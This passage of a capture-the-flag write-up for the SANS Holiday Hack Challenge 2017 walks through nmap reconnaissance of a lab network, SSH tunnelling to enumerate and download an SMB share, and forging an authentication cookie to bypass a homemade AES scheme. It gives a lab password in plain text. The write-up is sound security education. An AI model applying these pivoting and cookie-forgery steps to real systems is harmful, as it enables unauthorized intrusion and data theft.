|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  filtered ldap
8080/tcp open     http-proxy
| http-robots.txt: 1 disallowed entry
|_/dev
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00021s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-smb-server
| Not valid before: 2017-11-06T13:46:55
|_Not valid after:  2018-05-08T13:46:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Host script results:
|_nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00021s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Toys List
4444/tcp open  krb524

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00078s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Not valid before: 2017-11-23T20:53:55
|_Not valid after:  2018-05-25T20:53:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Post-scan script results:
| clock-skew:
|   0s:
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Nmap done: 256 IP addresses (7 hosts up) scanned in 14.86 seconds
</pre>
</div>
</div>
</div>
<div id="outline-container-org7d692ef" class="outline-3">
<h3 id="org7d692ef">SMB: Windows Fileshare</h3>
<div class="outline-text-3" id="text-org7d692ef">
</div>
<div id="outline-container-orge7e0aa2" class="outline-4">
<h4 id="q3_question"><a id="orge7e0aa2"></a>Question</h4>
<div class="outline-text-4" id="text-q3_question">
<p>
The North Pole engineering team uses a Windows SMB server for sharing
documentation and correspondence. Using your access to the Letters to
Santa server, identify and enumerate the SMB file-sharing server.
What is the file server share name?
</p>

<p>
<i>For hints, please see Holly Evergreen in the Cryokinetic Magic Level.</i>
</p>
</div>
</div>

<div id="outline-container-org1c70e19" class="outline-4">
<h4 id="q3_background-information"><a id="org1c70e19"></a>Background Information</h4>
<div class="outline-text-4" id="text-q3_background-information">
<p>
The scope statement calls out systems on 10.142.0.0/24 as being in scope:
</p>

<blockquote>
<p>
SCOPE: For this entire challenge, you are authorized to attack ONLY
the Letters to Santa system at l2s.northpolechristmastown.com AND
other systems on the internal 10.142.0.0/24 network that you access
through the Letters to Santa system.
</p>
</blockquote>

<p>
The question mentions pivoting through the Letters to Santa server (<code>l2s</code>). A commonly used tool for network discovery is <code>nmap</code>, and we can check that it's available on <code>l2s</code>:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.VmaV55tqZi5rteO9fXHB3kjM$ nmap -V

Nmap version 7.40 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
</pre>

<p>
There's a great <code>nmap</code> overview available here: <a href="https://nmap.org/book/nmap-overview-and-demos.html">https://nmap.org/book/nmap-overview-and-demos.html</a>
</p>

<p>
We also know that the SMB suite of protocols uses a lot of ports, but 445 is one of the main ones.
</p>

<p>
Blog Posts:
</p>

<p>
This post on the SANS Pen Testing Blog seems relevant, but masscan isn't installed on <code>l2s</code>:
</p>

<ul class="org-ul">
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a></li>
</ul>
</div>
</div>

<div id="outline-container-org25c9115" class="outline-4">
<h4 id="q3_goal"><a id="org25c9115"></a>Goal</h4>
<div class="outline-text-4" id="text-q3_goal">
<p>
Three separate things:
</p>

<ol class="org-ol">
<li>Identify the SMB server,</li>
<li>Enumerate the shares on it,</li>
<li>Name the file server share.</li>
</ol>
</div>
</div>

<div id="outline-container-org33a6086" class="outline-4">
<h4 id="q3_approach"><a id="org33a6086"></a>Approach</h4>
<div class="outline-text-4" id="text-q3_approach">
<p>
Let's follow the <code>nmap</code> overview.
</p>

<blockquote>
<p>
Being the careful type, Felix first starts out with what is known as
an Nmap list scan (-sL option). This feature simply enumerates every
IP address in the given target netblock(s) and does a reverse-DNS
lookup (unless -n was specified) on each. One reason to do this first
is stealth. The names of the hosts can hint at potential
vulnerabilities and allow for a better understanding of the target
network, all without raising alarm bells.
</p>
</blockquote>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -sL 10.142.0.0/24

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:40 UTC
Nmap scan report for 10.142.0.0
Nmap scan report for 10.142.0.1
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Nmap scan report for 10.142.0.4
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Nmap scan report for 10.142.0.9
Nmap scan report for 10.142.0.10
Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Nmap scan report for 10.142.0.12
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Nmap scan report for 10.142.0.14
Nmap scan report for 10.142.0.15
...
</pre>

<p>
Parsing the results a bit:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Hostname</th>
<th scope="col" class="org-right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">hhc17-l2s-proxy</td>
<td class="org-right">10.142.0.2</td>
</tr>

<tr>
<td class="org-left">hhc17-apache-struts1</td>
<td class="org-right">10.142.0.3</td>
</tr>

<tr>
<td class="org-left">mail</td>
<td class="org-right">10.142.0.5</td>
</tr>

<tr>
<td class="org-left">edb</td>
<td class="org-right">10.142.0.6</td>
</tr>

<tr>
<td class="org-left">hhc17-smb-server</td>
<td class="org-right">10.142.0.7</td>
</tr>

<tr>
<td class="org-left">hhc17-emi</td>
<td class="org-right">10.142.0.8</td>
</tr>

<tr>
<td class="org-left">hhc17-apache-struts2</td>
<td class="org-right">10.142.0.11</td>
</tr>

<tr>
<td class="org-left">eaas</td>
<td class="org-right">10.142.0.13</td>
</tr>
</tbody>
</table>

<p>
One of the systems is named <code>hhc17-smb-server</code>. 
</p>

<p>
Continuing with the overview, we can now narrow in on a single IP:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -p- -PS445 -A -T4 -oA avatartcpscan-%D 10.142.0.7

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:51 UTC
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00040s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-emi
| Not valid before: 2017-11-06T13:51:23
|_Not valid after:  2018-05-08T13:51:23
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=hhc17-emi
| Subject Alternative Name: DNS:hhc17-emi
| Not valid before: 2017-11-07T13:52:11
|_Not valid after:  2018-11-07T13:52:11
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
49666/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.99 seconds
</pre>

<p>
So it does indeed seem to be an SMB server. A command-line tool to access it is <code>smbclient</code>:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ smbclient -L 10.142.0.7 -U alabaster_snowball
rbash: smbclient: command not found
</pre>

<p>
It's not available on <code>l2s</code>. Another option is forwarding a port through SSH:
</p>

<pre class="example">
user@vps $ ssh alabaster_snowball@l2s.northpolechristmastown.com -O forward -L 4445:10.142.0.7:445
</pre>

<p>
Now we can access port 445 on <code>hhc17-smb-server</code> via port 4445 on <code>localhost</code>:
</p>

<pre class="example">
user@vps $ smbclient -L localhost -p 4445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password: 
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	FileStor        Disk
	IPC$            IPC       Remote IPC
Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
NetBIOS over TCP disabled -- no workgroup available
</pre>

<p>
<code>FileStor</code> looks interesting. Let's see what's on it:
</p>

<pre class="example">
user@vps $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password:
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
smb: \&gt; ls
  .                                   D        0  Wed Dec  6 16:51:46 2017
  ..                                  D        0  Wed Dec  6 16:51:46 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017

		13106687 blocks of size 4096. 9624115 blocks available
smb: \&gt; mget *
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (1094.4 KiloBytes/sec) (average 1094.4 KiloBytes/sec)
getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2818.7 KiloBytes/sec) (average 2231.9 KiloBytes/sec)
getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (666.0 KiloBytes/sec) (average 1924.0 KiloBytes/sec)
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (834.4 KiloBytes/sec) (average 1752.3 KiloBytes/sec)
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (99.1 KiloBytes/sec) (average 1599.3 KiloBytes/sec)
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (390.3 KiloBytes/sec) (average 1452.3 KiloBytes/sec)
</pre>
</div>
</div>

<div id="outline-container-orgd129ced" class="outline-4">
<h4 id="q3_solution"><a id="orgd129ced"></a>Solution</h4>
<div class="outline-text-4" id="text-q3_solution">
<p>
We used <code>nmap</code> to list our targets, and found <code>hhc17-smb-server</code>. We
used SSH forwarding to connect to it with <code>smbclient</code>. We used the
credentials we found for question 2 to connect.
</p>
</div>
</div>

<div id="outline-container-orgb4e1278" class="outline-4">
<h4 id="q3_common-pitfalls"><a id="orgb4e1278"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q3_common-pitfalls">
<p>
It looks like <code>hhc17-smb-server</code> blocks pings. By default, <code>nmap</code> uses
pings to determine which hosts are up, and which it should scan
further. We used the "list scan," which just did reverse DNS queries,
and were able to identify the system quickly. If, however, someone
just tried to run <code>nmap -p 445 10.142.0.0/24</code>, they wouldn't find the system.
</p>

<p>
It also looked like two systems were mixed up in NetBIOS and RDP SSL cert names:
</p>

<pre class="example">
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-emi
...
Host script results:
| nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
...
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
...
Host script results:
| nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
</pre>
</div>
</div>
</div>
<div id="outline-container-org596627a" class="outline-3">
<h3 id="org596627a">EWA: JWT All the Way</h3>
<div class="outline-text-3" id="text-org596627a">
</div>
<div id="outline-container-org0ef62a2" class="outline-4">
<h4 id="q4_question"><a id="org0ef62a2"></a>Question</h4>
<div class="outline-text-4" id="text-q4_question">
<p>
Elf Web Access (EWA) is the preferred mailer for North Pole elves,
available internally at <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>. What
can you learn from The Great Book page found in an e-mail on that
server?
</p>

<p>
<i>Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.</i>
</p>
</div>
</div>

<div id="outline-container-orge1710ea" class="outline-4">
<h4 id="q4_background-information"><a id="orge1710ea"></a>Background Information</h4>
<div class="outline-text-4" id="text-q4_background-information">
<p>
Hints:
</p>

<p>
Pepper Minstix gives us the following hints:
</p>

<ol class="org-ol">
<li>I'm so excited for the new email system that Alabaster Snowball set up for us. He spent a lot of time working on it. Should make it very easy for us to share cookie recipes. I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.</li>
<li>The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.</li>
<li>AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.</li>
<li>Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.</li>
<li>Every year when Santa gets back from delivering presents to the good girls and boys, he tells us stories about all the cookies he receives. I love everything about cookies! Cooking them, eating them, editing them, decorating them, you name it!</li>
</ol>
</div>
</div>

<div id="outline-container-org1c22c27" class="outline-4">
<h4 id="q4_goal"><a id="org1c22c27"></a>Goal</h4>
<div class="outline-text-4" id="text-q4_goal">
<p>
The question tells us that the page we're looking for is in an e-mail. So, we need to figure out some way to login to the mail system and find the crucial message.
</p>
</div>
</div>

<div id="outline-container-org71c7ddd" class="outline-4">
<h4 id="q4_approach"><a id="org71c7ddd"></a>Approach</h4>
<div class="outline-text-4" id="text-q4_approach">
<p>
First off, let's pull up the website in our web browser. SSH can run a
SOCKS proxy for us, which we can use to tunnel our traffic through
l2s. We use the access we got in Question 2 to SSH in:
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -D 31080 alabaster_snowball@l2s.northpolechristmastown.com
</pre>
</div>

<p>
I like to use Firefox for this, since, unlike Chrome, we can configure proxy settings different from the system-wide settings:
</p>


<div class="figure">
<p><img src="./images/firefox_proxy.png" alt="firefox_proxy.png" width="500px" />
</p>
<p><span class="figure-number">Figure 13: </span>Elf Web Access</p>
</div>

<p>
Now we can just navigate to <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>:
</p>


<div class="figure">
<p><img src="./images/ewa.png" alt="ewa.png" width="350px" />
</p>
<p><span class="figure-number">Figure 14: </span>Elf Web Access</p>
</div>

<p>
Luckily, we got Alabaster's password in Question 2, so let's login!
</p>


<div class="figure">
<p><img src="./images/bad_email.png" alt="bad_email.png" width="500px" />
</p>
<p><span class="figure-number">Figure 15: </span>Logging in as alabaster_snowball/stream_unhappy_buy_loss</p>
</div>

<p>
Of course! We need an e-mail address:
</p>


<div class="figure">
<p><img src="./images/bad_username.png" alt="bad_username.png" width="500px" />
</p>
<p><span class="figure-number">Figure 16: </span>Logging in as alabaster_snowball@northpolechristmastown.com/stream_unhappy_buy_loss</p>
</div>

<p>
Luckily, the error message tells us how we need to format the e-mail address:
</p>


<div class="figure">
<p><img src="./images/bad_password.png" alt="bad_password.png" width="500px" />
</p>
<p><span class="figure-number">Figure 17: </span>Logging in as alabaster_snowball@northpolechristmastown.com/stream_unhappy_buy_loss</p>
</div>

<p>
Curses! Looks like Alabaster is at least smart enough to not reuse credentials. At least he's following the password policy:
</p>


<div class="figure">
<p><img src="./images/password_policy.png" alt="password_policy.png" width="500px" />
</p>
<p><span class="figure-number">Figure 18: </span>MEMO - Password Policy Reminder.docx from the SMB FileStor</p>
</div>

<p>
Let's review some of the hints that Pepper gave us:
</p>

<blockquote>
<p>
I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.
</p>
</blockquote>

<p>
We scanned this EWA system with <code>nmap</code> before, and one of the <code>nmap</code> scripts did find a reference in <code>robots.txt</code>:
</p>

<pre class="example">
80/tcp   open  http
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</pre>

<p>
Given how much Pepper harps on cookies, perhaps this file is worth investigating. When we view it, we see:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">FOUND THESE FOR creating and validating cookies. Going to use this in node js</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cookie_maker</span>(<span style="color: #f0c674;">username</span>, <span style="color: #f0c674;">callback</span>){
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'need to put any length key in here'</span>;
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">randomly generates a string of 5 characters</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = rando_string(5)
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ciphertext</span> = aes256.encrypt(key, plaintext).replace(<span style="color: #8abeb7;">/\=/</span>g,<span style="color: #8abeb7;">''</span>);
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Setting the values of the cookie.</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">acookie</span> = [<span style="color: #8abeb7;">'IOTECHWEBMAIL'</span>,JSON.stringify({<span style="color: #8abeb7;">"name"</span>:username, <span style="color: #8abeb7;">"plaintext"</span>:plaintext,  <span style="color: #8abeb7;">"ciphertext"</span>:ciphertext}), { maxAge: 86400000, httpOnly: <span style="color: #81a2be;">true</span>, encode: String }]
    <span style="color: #b5bd68;">return</span> callback(acookie);
};
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cookie_checker</span>(<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">callback</span>){
    <span style="color: #b5bd68;">try</span>{
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'need to put any length key in here'</span>;
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrieving the cookie from the request headers and parsing it as JSON</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">thecookie</span> = JSON.parse(req.cookies.IOTECHWEBMAIL);
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrieving the cipher text </span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ciphertext</span> = thecookie.ciphertext;
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrievingin the username</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">username</span> = thecookie.name
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">retrieving the plaintext</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = aes256.decrypt(key, ciphertext);
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
        <span style="color: #b5bd68;">if</span> (plaintext === thecookie.plaintext) {
            <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">true</span>, username);
        } <span style="color: #b5bd68;">else</span> {
            <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
        }
    } <span style="color: #b5bd68;">catch</span> (e) {
        console.log(e);
        <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
    }
};
</pre>
</div>

<p>
There's a lot to parse here, but given the number of times AES and IVs are mentioned in the hints, this looks like we're on the right path.
</p>

<p>
Our next hint is:
</p>

<blockquote>
<p>
The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.
</p>
</blockquote>

<p>
Uh-oh&#x2026; Coming up with your own cryptography scheme should send up all the red flags.
</p>

<blockquote>
<p>
Happy families are all alike; every unhappy family is unhappy in its own way. &#x2013;   Leo Tolstoy
</p>
</blockquote>

<blockquote>
<p>
Empty plaintext encrypted without using HMAC are all alike; Rolling your own crypto makes all cryptographers unhappy. &#x2013; Justin Azoff
</p>
</blockquote>

<p>
At this point, we suspect that there's some kind of vulnerability in the cryptography being used. Reading on:
</p>

<blockquote>
<p>
AES256? Honestly, I don't know much about it, but Alabaster explained
the basic idea and it sounded easy. During decryption, the first 16
bytes are removed and used as the initialization vector or "IV." Then
the IV + the secret key are used with AES256 to decrypt the remaining
bytes of the encrypted string.
</p>
</blockquote>

<p>
Let's pause for a moment to review what we know so far. The e-mail application uses cookies for authentication.
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">acookie</span> = [<span style="color: #8abeb7;">'IOTECHWEBMAIL'</span>,JSON.stringify({<span style="color: #8abeb7;">"name"</span>:username, <span style="color: #8abeb7;">"plaintext"</span>:plaintext,  <span style="color: #8abeb7;">"ciphertext"</span>:ciphertext}), 
               { maxAge: 86400000, httpOnly: <span style="color: #81a2be;">true</span>, encode: String }]
</pre>
</div>

<p>
As we can see from the line above, the cookie contains a username,
some plaintext, and some ciphertext. The <code>cookie_checker</code> function
takes the encrypted ciphertext, and attempts to decrypt it with a
secret key that only the application has. If the result matches the
plaintext from the cookie, the cookie is authentic:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = aes256.decrypt(key, ciphertext);
<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
<span style="color: #b5bd68;">if</span> (plaintext === thecookie.plaintext) {
    <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">true</span>, username);
} <span style="color: #b5bd68;">else</span> {
    <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
}
</pre>
</div>

<p>
The code, as well as Pepper's hints, tell us something about the structure of the ciphertext:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">makes the string into cipher text .... in base64. </span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
</pre>
</div>

<p>
Finally, Pepper gives us this tantalizing hint:
</p>

<blockquote>
<p>
Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.
</p>
</blockquote>

<p>
By reading the code closely we can see that when the application <b>creates</b> a cookie, the plaintext is 5 random characters. However, nothing in the verification logic requires this. The only check is:
</p>

<div class="org-src-container">
<pre class="src src-js">aes256.decrypt(key, ciphertext) === thecookie.plaintext
</pre>
</div>

<p>
Let's see what a valid cookie looks like:
</p>

<pre class="example">
$ http --proxy=http:socks5://@localhost:31080 'http://mail.northpolechristmastown.com/'
HTTP/1.1 200 OK
...
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: EWA={"name":"GUEST","plaintext":"","ciphertext":""}; Max-Age=86400; Path=/; Expires=Wed, 10 Jan 2018 23:37:29 GMT; HttpOnly
...
</pre>

<p>
Let's try what Pepper Minstix suggests: setting our ciphertext to only
be 16 characters long. We know that this is base64 encoded, so we'll
run:
</p>

<pre class="example">
$ echo -n "Security at NCSA" | base64
U2VjdXJpdHkgYXQgTkNTQQ==
</pre>

<p>
We're using the <code>-n</code> flag of <code>echo</code> to not have a newline at the end, which would give us a 17 character length cookie.
</p>

<pre class="example">
$ http --proxy=http:socks5://@localhost:31080 'http://mail.northpolechristmastown.com/' 
  'Cookie:EWA={"name":"alabaster.snowball@northpolechristmastown.com","ciphertext":"U2VjdXJpdHkgYXQgTkNTQQ==","plaintext":""}'
HTTP/1.1 200 OK
...
X-Powered-By: Express

&lt;script&gt;window.location.href='/account.html'&lt;/script&gt;
</pre>

<p>
That looks promising! Let's move from the command line back to Firefox. One easy way to edit cookies in Firefox is to go to Tools <code>&gt; Web Developer =&gt; Storage Inspector. We should see an =EWA</code> cookie in there already, and we can simply double-click the value field and paste in our forged cookie:
</p>

<pre class="example">
{"name":"alabaster.snowball@northpolechristmastown.com","ciphertext":"U2VjdXJpdHkgYXQgTkNTQQ==","plaintext":""}
</pre>

<p>
Now we just reload the page, and we're in!
</p>


<div class="figure">
<p><img src="./images/ewa_loggedin.png" alt="ewa_loggedin.png" width="500px" />
</p>
<p><span class="figure-number">Figure 19: </span>Logging in with our forged cookie</p>
</div>

<p>
At this point, we can start digging through Alabaster's e-mail. Soon, we find this email leading us to <a href="https://www.holidayhackchallenge.com/2017/pages/f192a884f68af24ae55d9d9ad4adf8d3a3995258/GreatBookPage4.pdf">http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf</a>:
</p>


<div class="figure">
<p><img src="./images/page4_email.png" alt="page4_email.png" width="500px" />
</p>
<p><span class="figure-number">Figure 20: </span>Page 4 E-mail</p>
</div>
</div>

<ul class="org-ul">
<li><a id="org25e72dc"></a>An Alternative Solution: Black Box Cracking<br />
<div class="outline-text-6" id="text-org25e72dc">
<p>
Given some of the discussion in the chat, this was one of the hardest
questions. This section goes deeper into the cookie creation and
validation code, and it offers an alternative solution. Finding
<code>cookie.txt</code> from the <code>robots.txt</code> file made this question much
easier, but this version lays out the approach to solve this question
without that file. Independently, one of our team members used the
previous solution, and one used this solution.
</p>

<p>
The Javascript code used is a variation of a challenge response
algorithm, but it is flawed in that the client is providing both the
challenge and the response.  It is also flawed in that it does not use
MAC
<a href="https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)">https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)</a>
